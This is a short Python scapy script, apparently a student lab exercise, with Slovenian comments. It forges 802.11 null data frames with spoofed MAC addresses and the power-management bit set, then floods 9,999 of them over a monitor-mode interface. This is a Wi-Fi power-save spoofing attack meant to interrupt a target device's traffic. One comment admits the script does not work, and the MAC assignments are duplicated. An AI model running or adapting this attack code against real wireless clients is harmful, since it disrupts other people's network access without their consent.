from scapy.all import *
import argparse

target_mac = "9C:B6:D0:8C:03:4B"
gateway_mac = "FE:DE:90:A4:A0:FF"  # fon

target_mac = "FE:DE:90:A4:A0:FF"  # fon
gateway_mac = "9C:B6:D0:8C:03:4B"


def write(pkt):
    wrpcap("filtered.pcap", pkt, append=True)  # appends packet to output file


if __name__ == "__main__":
    # https://en.wikipedia.org/wiki/802.11_Frame_Types
    dot11 = Dot11(
        addr1=target_mac,
        addr2=gateway_mac,
        addr3=gateway_mac,
        type=2,  # data frame
        subtype=4,  # null data frame
        FCfield=0x11,  # ...1 .... = PWR MGT: STA will go to sleep
        ID=0xFF,  # ID polje je v null data pwr_mgmt paketu uporabljeno kot "duration"
    )

    packet = RadioTap() / dot11

    write(pkt=packet)
    sendp(
        packet, iface="wlan0mon", count=9999, inter=0.001
    )  # FUCK ME NEDELA, PRAŠI NA VAJAH
